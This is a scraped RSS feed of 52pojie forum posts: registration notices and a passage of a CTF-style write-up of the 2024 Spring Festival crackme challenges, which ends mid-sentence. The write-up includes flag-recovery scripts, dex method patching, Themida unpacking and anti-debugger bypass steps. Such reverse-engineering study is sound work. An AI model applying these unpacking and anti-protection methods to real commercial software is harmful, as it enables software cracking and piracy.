<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140216&amp;idx=1&amp;sn=db8ffb124fb2682de404536278f8893f&amp;chksm=bd50a02c8a27293aca1512867952c33deb7f219c6bff8ba7901380813a8c9686c655d7c1448d&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140216&amp;idx=1&amp;sn=db8ffb124fb2682de404536278f8893f&amp;chksm=bd50a02c8a27293aca1512867952c33deb7f219c6bff8ba7901380813a8c9686c655d7c1448d&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> ❶ 事件名称：吾爱破解网站发布2024年03月14日的消息
<br />
❷ 发布时间：11:19
<br />
❸ 发布地点：北京
<br /> <div>
<p>
<span>吾爱pojie</span> <span>2024-03-14 11:19</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        
                      </div>
]]></content:encoded>
<pubDate>Thu, 14 Mar 2024 11:19:20 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告即将开始 12：00 -- 14：00 和 20：00 -- 22：00。

赶不上的定个晚间闹钟吧，新通知会在B站继续发布。

推荐使用电脑注册，可以使用论坛的诊断修复工具修复一次，方便提前解决注册中可能会遇到的问题，如果修复后还是不行建议尽快更换设备尝试。

注册页面会强制10分钟来阅读注册须知，须知中包括了你注册现在和未来可能会遇到的问题，请仔细阅读，否则可能无法注册成功或注册后被清理。

开放注册期间暂停签到任务、QQ登录绑定、下载论坛附件功能、默认搜索功能等功能请各位知晓，在论坛等待大家光临。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140214&amp;idx=1&amp;sn=7c3de58302fc3da5d1dfb436567717fd&amp;chksm=bd50a0228a272934d1a98f07c75ce86f7f689b1060f1b4f1faf47cdc16b50488f7bb3bdcab62&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140214&amp;idx=1&amp;sn=7c3de58302fc3da5d1dfb436567717fd&amp;chksm=bd50a0228a272934d1a98f07c75ce86f7f689b1060f1b4f1faf47cdc16b50488f7bb3bdcab62&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 📅 2024年3月13日  
🕚 11:15  
📍 北京  

1. 2024年3月13日上午11:15，这则新闻发生在北京。<br />

2. 请注意，这是中国当地时间，可能与您所在地的时间存在差异。<br /> <div>
<p>
<span></span> <span>2024-03-13 11:15</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a><a></a>
                      </div>
]]></content:encoded>
<pubDate>Wed, 13 Mar 2024 11:14:42 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册微信抽奖活动，再送40个账号注册码或300论坛币，下午两点开奖，详见【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告。

注：中奖后务必今天领奖，延期无效。

另：明天开放注册期间暂停签到任务、下载论坛附件功能、默认搜索功能、QQ登录绑定等功能（忘记账号密码可以邮箱重置后登陆）请各位知晓。主要把下载附件的带宽和服务器负载节省下来供用户注册访问使用，等注册结束就恢复了（默认搜索功能根据论坛负载压力预计一周左右恢复），请大家谅解。另外新注册的会员需要注册一天后才可以发帖，以缓解注册压力。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140212&amp;idx=1&amp;sn=c631371d786bc30870b342f907df53a3&amp;chksm=bd50a0208a272936dd6fa90d4b999df2f75aa3fca0cddfd18c969d530cf8679518b39335d5c1&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140212&amp;idx=1&amp;sn=c631371d786bc30870b342f907df53a3&amp;chksm=bd50a0208a272936dd6fa90d4b999df2f75aa3fca0cddfd18c969d530cf8679518b39335d5c1&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-03-12 10:25</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a>
                      </div>
]]></content:encoded>
<pubDate>Tue, 12 Mar 2024 10:25:40 +0800</pubDate>
</item>
<item>
<title>吾爱破解 2024 春节红包活动WP(全，含 Android 高级题)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140210&amp;idx=1&amp;sn=0f3c8d79d823ad6dfd30b95fbd11be9b&amp;chksm=bd50a0268a272930a694d989c02d58121311eabfddd56f63bd7be73ea316efa76872584c1bd2&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140210&amp;idx=1&amp;sn=0f3c8d79d823ad6dfd30b95fbd11be9b&amp;chksm=bd50a0268a272930a694d989c02d58121311eabfddd56f63bd7be73ea316efa76872584c1bd2&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-03-11 12:18</span> <span style="display: inline-block;">北京</span>
</p>

<p>来自解题领红包全能榜唯一一名选手的​解题分享。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=722a6273&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJRX82Zg6HXlBWDkNDBpCfHaSxr0m1c4kwbej16Q5yUiaxHiaajYiaWg3udxxZJDzCSowyn9icicRu0mrA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>4qwerty7</strong></p><p style="text-align: start; line-height: normal; margin-bottom: 0px;"><span style="color: #0000ff; font-family: Segoe UI, Tahoma, Hiragino Sans GB, Microsoft Yahei, Simsun;"><span style="font-size: 20px; letter-spacing: 0.544px; background-color: rgb(255, 255, 255);"><strong>来自解题领红包全能榜唯一一名选手的解题分享。</strong></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><h2>送分题</h2><p>公众号发送提示内容即可。</p><h2>Windows 初级题</h2><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">int __cdecl main(int argc, const char **argv, const char **envp)<br />{<br />// definations<br />  Src[4] = 0;<br />  v30 = 15;<br />  LOBYTE(Src[0]) = 0;<br />  sub_B42560(Src, <span style="color: rgb(168, 255, 96);">"ioCj~KCss|bQ6zbhCu$5r57$Iljkwlqj$$$?"</span>, 0x24u);<br />  v36 = 0;<br />  SetConsoleTitleA(&amp;ConsoleTitle);<br />  v34 = 0;<br />  v35 = 15;<br />  LOBYTE(v33[0]) = 0;<br />  LOBYTE(v36) = 1;<br />  v4 = sub_B427D0(v3, <span style="color: rgb(168, 255, 96);">"Please input password: "</span>);<br />  sub_B42A80((int)v4);<br />  sub_B431E0(&amp;dword_B6E088, v33);<br />  v6 = v35;<br />  v7 = (void **)v33[0];<br />  if ( v34 == 36 ) // check length<br />  {<br />    sub_B42490(&amp;v27, Src);<br />    sub_B41FE0((int)Block, -3, v27, v28);<br />    LOBYTE(v36) = 2;<br />    v9 = Block;<br />    v10 = v33;<br />    if ( v32 &gt;= 0x10 )<br />      v9 = (void **)Block[0];<br />    if ( v6 &gt;= 0x10 )<br />      v10 = v7;<br />    if ( Block[4] != (void *)36 )<br />      goto LABEL_19;<br />    v11 = 32;<br />    while ( 1 ) // compare<br />    {<br />      v12 = *v10;<br />      if ( *v10 != *v9 )<br />        break;<br />      ++v10;<br />      ++v9;<br />      v14 = v11 &lt; 4;<br />      v11 -= 4;<br />      if ( v14 )<br />      {<br />        v13 = 0;<br />        goto LABEL_18;<br />      }<br />    }<br />    v14 = (unsigned __int8)v12 &lt; *(_BYTE *)v9;<br />    if ( (_BYTE)v12 == *(_BYTE *)v9<br />      &amp;&amp; (v15 = *((_BYTE *)v10 + 1), v14 = v15 &lt; *((_BYTE *)v9 + 1), v15 == *((_BYTE *)v9 + 1))<br />      &amp;&amp; (v16 = *((_BYTE *)v10 + 2), v14 = v16 &lt; *((_BYTE *)v9 + 2), v16 == *((_BYTE *)v9 + 2))<br />      &amp;&amp; (v17 = *((_BYTE *)v10 + 3), v14 = v17 &lt; *((_BYTE *)v9 + 3), v17 == *((_BYTE *)v9 + 3)) )<br />    {<br />      v13 = 0;<br />    }<br />    else<br />    {<br />      v13 = v14 ? -1<span style="color: rgb(150, 203, 254);"> :</span> 1;<br />    }<br />LABEL_18:<br />    v18 = <span style="color: rgb(168, 255, 96);">"Success"</span>;<br />    if ( v13 )<br />LABEL_19:<br />      v18 = <span style="color: rgb(168, 255, 96);">"Wrong,please try again."</span>;<br />    v19 = sub_B427D0((int)v9, v18);<br />// end logic<br />  return 0;<br />}</code></pre><p>输入一个长度为 36 的串，在开始比较处下断点，发现比较的是用户输入和flag，提交flag即可。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">fl@g{H@ppy_N3w_e@r!2o24!Fighting!!!}</code></p><p>1.1版本多了个!，会有个 jumpout，这是因为IDA把它识别成了两个函数，需要 undefine 第二个函数，并把相关代码识别到第一个函数里面：</p><p><code style="font-family: SFMono-Regular, Consolas, ;">fl@g{H@ppy_N3w_e@r!2o24!Fighting!!!!}</code></p><h2>Android 初级题一</h2><p>jadx 打开，阅读 MainActivity 和 YSQDActivity 代码发现 flag 位于 ys.mp4 末尾，内容为 <code style="font-family: SFMono-Regular, Consolas, ;">flag{happy_new_year_2024}</code>。</p><h2>Android 初级题二</h2><p>jadx 打开，阅读 FlagActivity 代码发现 flag 是数组 <code style="font-family: SFMono-Regular, Consolas, ;">{86, -18, 98, 103, 75, -73, 51, -104, 104, 94, 73, 81, 125, 118, 112, 100, -29, 63, -33, -110, 108, 115, 51, 59, 55, 52, 77}</code> 与 apk 证书二进制内容的异或。</p><p>编写得到证书的脚本</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> struct<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_v2_signature</span>(path, verbose=<span style="color: rgb(198, 197, 254);">True</span>):<br />    buf = open(path, <span style="color: rgb(168, 255, 96);">'rb'</span>).read()<br />    off = <span style="color: rgb(255, 115, 253);">0</span><br />    i = <span style="color: rgb(255, 115, 253);">0</span><br />    <span style="color: rgb(124, 124, 124);"># find zip's EOCD</span><br />    <span style="color: rgb(150, 203, 254);">while</span> <span style="color: rgb(198, 197, 254);">True</span>:<br />        off = len(buf) - i - <span style="color: rgb(255, 115, 253);">2</span><br />        n, = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;H'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">2</span>])<br />        <span style="color: rgb(150, 203, 254);">if</span> n == i:<br />            off -= <span style="color: rgb(255, 115, 253);">20</span><br />            <span style="color: rgb(150, 203, 254);">if</span> (struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">4</span>])[<span style="color: rgb(255, 115, 253);">0</span>] ^ <span style="color: rgb(255, 115, 253);">0xcafebabe</span>) == <span style="color: rgb(255, 115, 253);">0xccfbf1ee</span>:<br />                <span style="color: rgb(150, 203, 254);">break</span><br />        <span style="color: rgb(150, 203, 254);">assert</span> i &lt; <span style="color: rgb(255, 115, 253);">0xffff</span>, <span style="color: rgb(168, 255, 96);">'cannot find eocd'</span><br />        i += <span style="color: rgb(255, 115, 253);">1</span><br />    off += <span style="color: rgb(255, 115, 253);">16</span><br />    offset, = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">4</span>])<br />    off = offset - <span style="color: rgb(255, 115, 253);">0x18</span><br />    <span style="color: rgb(124, 124, 124);"># apk sig block is before the central directory starts</span><br />    sig_block_size, = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;Q'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">8</span>])<br />    off += <span style="color: rgb(255, 115, 253);">8</span><br />    <span style="color: rgb(150, 203, 254);">assert</span> buf[off:off+<span style="color: rgb(255, 115, 253);">0x10</span>] == <span style="color: rgb(168, 255, 96);">b'APK Sig Block 42'</span>, <span style="color: rgb(168, 255, 96);">'sig block magic mismatch'</span><br />    off = offset - sig_block_size<br />    <span style="color: rgb(150, 203, 254);">assert</span> struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;Q'</span>, buf[off-<span style="color: rgb(255, 115, 253);">8</span>:off])[<span style="color: rgb(255, 115, 253);">0</span>] == sig_block_size, <span style="color: rgb(168, 255, 96);">'sig block size mismatch'</span><br />    first_cert = <span style="color: rgb(198, 197, 254);">None</span><br />    cert_cnt = <span style="color: rgb(255, 115, 253);">0</span><br />    <span style="color: rgb(150, 203, 254);">while</span> <span style="color: rgb(198, 197, 254);">True</span>:<br />        cur_size, id_value = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;QI'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">12</span>])<br />        <span style="color: rgb(150, 203, 254);">if</span> cur_size == sig_block_size:<br />            <span style="color: rgb(150, 203, 254);">break</span><br />        <span style="color: rgb(150, 203, 254);">if</span> verbose:<br />            print(<span style="color: rgb(168, 255, 96);">f'offset: 0x<span style="color: rgb(218, 239, 163);">{off:08x}</span>, size: 0x<span style="color: rgb(218, 239, 163);">{cur_size:08x}</span>, id: 0x<span style="color: rgb(218, 239, 163);">{id_value:08x}</span>'</span>)<br />        cur_off = off + <span style="color: rgb(255, 115, 253);">8</span><br />        off += <span style="color: rgb(255, 115, 253);">12</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (id_value ^ <span style="color: rgb(255, 115, 253);">0xdeadbeef</span>) == <span style="color: rgb(255, 115, 253);">0xafa439f5</span> <span style="color: rgb(150, 203, 254);">or</span> (id_value ^ <span style="color: rgb(255, 115, 253);">0xdeadbeef</span>) == <span style="color: rgb(255, 115, 253);">0x2efed62f</span>:<br />            off += <span style="color: rgb(255, 115, 253);">4</span> * <span style="color: rgb(255, 115, 253);">3</span> <span style="color: rgb(124, 124, 124);"># signer-sequence length, signer length, signed data length</span><br />            off += <span style="color: rgb(255, 115, 253);">4</span> + struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">4</span>])[<span style="color: rgb(255, 115, 253);">0</span>] <span style="color: rgb(124, 124, 124);"># digests-sequence length, digests-sequence</span><br />            off += <span style="color: rgb(255, 115, 253);">4</span> <span style="color: rgb(124, 124, 124);"># certificates length</span><br />            cert_size, = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">4</span>]) <span style="color: rgb(124, 124, 124);"># certificate length</span><br />            off += <span style="color: rgb(255, 115, 253);">4</span><br />            cert = buf[off:off+cert_size]<br />            base_hash = <span style="color: rgb(255, 115, 253);">1</span><br />            <span style="color: rgb(150, 203, 254);">for</span> i, v <span style="color: rgb(150, 203, 254);">in</span> enumerate(cert):<br />                base_hash = (base_hash * <span style="color: rgb(255, 115, 253);">31</span> + (v <span style="color: rgb(150, 203, 254);">if</span> v &lt; <span style="color: rgb(255, 115, 253);">0x80</span> <span style="color: rgb(150, 203, 254);">else</span> v - <span style="color: rgb(255, 115, 253);">256</span> + <span style="color: rgb(255, 115, 253);">2</span>**<span style="color: rgb(255, 115, 253);">32</span>)) &amp; <span style="color: rgb(255, 115, 253);">0xffffffff</span><br />            base_hash ^= <span style="color: rgb(255, 115, 253);">0x14131211</span><br />            <span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(150, 203, 254);">not</span> verbose:<br />                <span style="color: rgb(150, 203, 254);">return</span> cert<br />            print(<span style="color: rgb(168, 255, 96);">f"    size: 0x<span style="color: rgb(218, 239, 163);">{cert_size:04x}</span>, hash: 0x<span style="color: rgb(218, 239, 163);">{base_hash:08x}</span>"</span>)<br />            <span style="color: rgb(150, 203, 254);">if</span> first_cert <span style="color: rgb(150, 203, 254);">is</span> <span style="color: rgb(198, 197, 254);">None</span>:<br />                first_cert = cert<br />        off = cur_off + cur_size<br />    <span style="color: rgb(150, 203, 254);">return</span> first_cert<br /><br />cert = get_v2_signature(<span style="color: rgb(168, 255, 96);">'【2024春节】解题领红包之Android初级题二.apk'</span>)<br />print(bytes([(a&amp;<span style="color: rgb(255, 115, 253);">0xff</span>)^b <span style="color: rgb(150, 203, 254);">for</span> a,b <span style="color: rgb(150, 203, 254);">in</span> zip([<span style="color: rgb(255, 115, 253);">86</span>, -<span style="color: rgb(255, 115, 253);">18</span>, <span style="color: rgb(255, 115, 253);">98</span>, <span style="color: rgb(255, 115, 253);">103</span>, <span style="color: rgb(255, 115, 253);">75</span>, -<span style="color: rgb(255, 115, 253);">73</span>, <span style="color: rgb(255, 115, 253);">51</span>, -<span style="color: rgb(255, 115, 253);">104</span>, <span style="color: rgb(255, 115, 253);">104</span>, <span style="color: rgb(255, 115, 253);">94</span>, <span style="color: rgb(255, 115, 253);">73</span>, <span style="color: rgb(255, 115, 253);">81</span>, <span style="color: rgb(255, 115, 253);">125</span>, <span style="color: rgb(255, 115, 253);">118</span>, <span style="color: rgb(255, 115, 253);">112</span>, <span style="color: rgb(255, 115, 253);">100</span>, -<span style="color: rgb(255, 115, 253);">29</span>, <span style="color: rgb(255, 115, 253);">63</span>, -<span style="color: rgb(255, 115, 253);">33</span>, -<span style="color: rgb(255, 115, 253);">110</span>, <span style="color: rgb(255, 115, 253);">108</span>, <span style="color: rgb(255, 115, 253);">115</span>, <span style="color: rgb(255, 115, 253);">51</span>, <span style="color: rgb(255, 115, 253);">59</span>, <span style="color: rgb(255, 115, 253);">55</span>, <span style="color: rgb(255, 115, 253);">52</span>, <span style="color: rgb(255, 115, 253);">77</span>], cert)]))</code></pre><p>得到flag为 <code style="font-family: SFMono-Regular, Consolas, ;">flag{52pj_HappyNewYear2024}</code>。</p><h2>Android 中级题</h2><p>jadx 打开，阅读 MainActivity 发现会加载 classes.dex 并调用 com.zj.wuaipojie2024_2.C 的 isValidate 方法验证输入。</p><p>而 isValidate 方法 则会调用 com.zj.wuaipojie2024_2.A 的 d 方法，注意拿到方法的过程中调用了 fix 修复 classes，使用的参数是 getResources().getIntArray(C0888R.array.A_offset)。</p><p>在 res/values/arrays.xml 里看到</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">&lt;?xml version=<span style="color: rgb(168, 255, 96);">"1.0"</span> encoding=<span style="color: rgb(168, 255, 96);">"utf-8"</span>?&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;resources&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;array name=<span style="color: rgb(168, 255, 96);">"A_offset"</span>&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>0<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>3<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>7908<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;/array&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;array name=<span style="color: rgb(168, 255, 96);">"D_offset"</span>&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>1<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>1<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>8108<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;/array&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;/resources&gt;</span></code></pre><p>阅读 fix 代码可知三个参数分别是 class_def 编号、direct_methods 编号、encoded_method 的第 3 个 uleb128 参数即 code_off 要被修改为的值。</p><p>010 editor 打开 classes.dex 并应用模板，将相应 code_off 修改为 uleb128 编码的 7908（由于 hex(7908) == '0x1ee4' hex(0x1e&lt;&lt;1|1) == '0x3d'，所以是 E4 3D）。</p><p>修改后 jadx 打开 classes.dex，看到 d 函数开头调用 native 函数基于 socket connect 检查了 frida server 并验证包签名后对 str 做检查。</p><p>然后提示内容在 B.d 中，而 B.d 的内容显然是无意义的，因此猜测需要按 D_offset 的内容进行修复，而 D_offset 的 class_def 编号和 direct_methods 编号都对的上，因此用同样的方法打开 010 editor 对 code_off 进行 patch（由于 hex(8108) == '0x1fac' hex(0x1f&lt;&lt;1|1) == '0x3f'，所以是 AC 3F）。</p><p>发现内容为 <code style="font-family: SFMono-Regular, Consolas, ;">return "机缘是{" + Utils.md5(Utils.getSha1("password+你的uid".getBytes())) + "}";</code>。</p><p>猜测 password 为签名验证的 str。</p><p>据此抄写 jadx 输出编写程序即可</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> java.math.BigInteger;<br /><span style="color: rgb(150, 203, 254);">import</span> java.security.MessageDigest;<br /><span style="color: rgb(150, 203, 254);">import</span> java.security.NoSuchAlgorithmException;<br /><br /><span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">Main</span> {<br />        <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">byte</span>[] getSha1(<span style="color: rgb(255, 255, 182);">byte</span>[] bArr) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">return</span> MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"SHA"</span>).digest(bArr);<br />        } <span style="color: rgb(150, 203, 254);">catch</span> (Exception unused) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">md5</span>(<span style="color: rgb(255, 255, 182);">byte</span>[] bArr) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">bigInteger</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">BigInteger</span>(<span style="color: rgb(255, 115, 253);">1</span>, MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"md5"</span>).digest(bArr)).toString(<span style="color: rgb(255, 115, 253);">16</span>);<br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">32</span> - bigInteger.length(); i++) {<br />                bigInteger = <span style="color: rgb(168, 255, 96);">"0"</span> + bigInteger;<br />            }<br />            <span style="color: rgb(150, 203, 254);">return</span> bigInteger;<br />        } <span style="color: rgb(150, 203, 254);">catch</span> (NoSuchAlgorithmException unused) {<br />            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"ops!!"</span>);<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">main</span>(String[] args) {<br />        <span style="color: rgb(255, 255, 182);">StringBuffer</span> <span style="color: rgb(198, 197, 254);">stringBuffer</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">StringBuffer</span>();<br />        <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = <span style="color: rgb(255, 115, 253);">0</span>;<br />        <span style="color: rgb(150, 203, 254);">while</span> (stringBuffer.length() &lt; <span style="color: rgb(255, 115, 253);">9</span> &amp;&amp; i &lt; <span style="color: rgb(255, 115, 253);">40</span>) {<br />            <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i2</span> = i + <span style="color: rgb(255, 115, 253);">1</span>;<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">substring</span> = <span style="color: rgb(168, 255, 96);">"0485312670fb07047ebd2f19b91e1c5f"</span>.substring(i, i2);<br />            <span style="color: rgb(150, 203, 254);">if</span> (!stringBuffer.toString().contains(substring)) {<br />                stringBuffer.append(substring);<br />            }<br />            i = i2;<br />        }<br />        <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">password</span> = stringBuffer.toString().toUpperCase();<br />        System.out.println(password);<br />        System.out.println(md5(getSha1((password + <span style="color: rgb(168, 255, 96);">"691872"</span>).getBytes())));<br />    }<br />}</code></pre><p>password 为 048531267</p><p>最后这一部分 flag 是否有 {} 等细节多少有点迷，不过问题不大。</p><h2>Windows 高级题</h2><p>客户端类 UPX 壳，没法用 UPX 自动脱壳，因此用“ESP 定律”脱，脱下来随便修复下（不用能跑，ida里能看即可）。</p><p>服务端 Themida 强壳，但 unlicense 非常nb，按提示在 conda 里装个 python 3.10 32-bit：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">conda create -n py310_32<br />conda activate py310_32<br />conda config --env --set subdir win-32<br />conda install python=3.10<br />conda activate py310_32</code></pre><p>然后用这个工具就可以完美脱壳，并能正确运行。</p><p>然后有一些反调试，但是 x64dbg 下用 ScyllaHide Themida Profile 基本都能自动过掉，无须操心。</p><p>IDA 里阅读客户端代码可知调用的是 out-of-process 的、 .exe 的 COM 接口。服务端注册后，客户端获得 COM 对象时 Windows 就会自动启动服务端，随后通过RPC受理调用请求。</p><p>在 